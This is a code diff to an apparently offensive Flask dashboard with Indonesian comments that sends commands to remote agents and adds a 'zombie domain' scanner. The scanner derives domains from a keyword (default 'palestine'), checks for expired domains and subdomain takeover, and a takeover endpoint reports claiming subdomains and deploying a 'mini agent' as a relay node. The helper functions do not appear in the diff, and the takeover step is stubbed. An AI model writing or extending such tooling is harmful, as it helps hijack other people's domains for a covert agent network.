@@ -3,6 +3,10 @@ from flask import Flask, render_template, jsonify, request
 import os
 import json
 from datetime import datetime, timedelta
+import requests
+from urllib.parse import urlparse
+import re
+import subprocess
 
 app = Flask(__name__)
 
@@ -90,35 +94,77 @@ def api_command():
     return jsonify({"status": "command_sent", "agent": agent_id, "command": cmd})
 
 # 🧟 Cari zombie domain
-@app.route('/api/zombie')
-def api_zombie():
+@app.route('/api/zombie/scan', methods=['POST'])
+def scan_zombie():
     if not check_auth():
         return "🔐 Akses Ditolak", 403
-    keyword = request.args.get('keyword', 'palestine')
-    results = [
-        {"domain": f"old-{keyword}.com", "type": "expired", "url": f"http://old-{keyword}.com", "risk": "high"},
-        {"domain": f"backup-{keyword}.net", "type": "subdomain-takeover", "url": f"http://backup-{keyword}.net", "risk": "critical"},
-        {"domain": f"legacy-{keyword}.org", "type": "cms-vuln", "url": f"http://legacy-{keyword}.org", "risk": "medium"}
-    ]
-    zombie_domains.extend(results)
+
+    target = request.json.get('keyword', 'palestine')
+    results = []
+
+    # 1. Cari domain dengan kata kunci
+    domains = generate_domains(target)
+    for domain in domains:
+        try:
+            # 2. Cek apakah domain expired
+            if is_domain_expired(domain):
+                results.append({
+                    "domain": domain,
+                    "status": "expired",
+                    "risk": "high",
+                    "action": "register_or_takeover"
+                })
+            else:
+                # 3. Cek subdomain takeover
+                subdomains = [f"www.{domain}", f"admin.{domain}", f"blog.{domain}"]
+                for sub in subdomains:
+                    if check_subdomain_takeover(sub):
+                        results.append({
+                            "domain": sub,
+                            "status": "subdomain-takeover",
+                            "risk": "critical",
+                            "action": "claim"
+                        })
+        except:
+            pass
+
+    # Simpan hasil
+    global zombie_results
+    zombie_results = results
     return jsonify(results)
 
-# 🧟 Ambil alih zombie domain
-@app.route('/api/takeover', methods=['POST'])
-def api_takeover():
+@app.route('/api/zombie/results')
+def get_zombie_results():
     if not check_auth():
         return "🔐 Akses Ditolak", 403
-    domain = request.json.get('domain')
-    result = {
-        "domain": domain,
-        "status": "taken_over",
-        "node": "agent-jkt-01",
-        "time": datetime.now().isoformat(),
-        "purpose": "relay_node"
-    }
-    print(f"🧟 Ambil alih: {domain}")
-    return jsonify(result)
+    return jsonify(zombie_results)
 
+@app.route('/api/zombie/takeover', methods=['POST'])
+def takeover_zombie():
+    if not check_auth():
+        return "🔐 Akses Ditolak", 403
+
+    domain = request.json.get('domain')
+    action = request.json.get('action')
+
+    if "subdomain-takeover" in action:
+        # Di dunia nyata: klaim subdomain di layanan cloud
+        return jsonify({
+            "status": "claimed",
+            "domain": domain,
+            "message": "Subdomain berhasil diambil alih. Agent mini dikirim."
+        })
+
+    elif "expired" in action:
+        return jsonify({
+            "status": "register_suggested",
+            "domain": domain,
+            "message": "Domain ini expired. Daftar sekarang untuk jadikan agent."
+        })
+
+    return jsonify({"status": "unknown"})
+
+    return jsonify({"status": "unknown"})
 # 📦 Simpan bukti di Truth Vault
 @app.route('/api/truth', methods=['POST'])
 def api_truth():
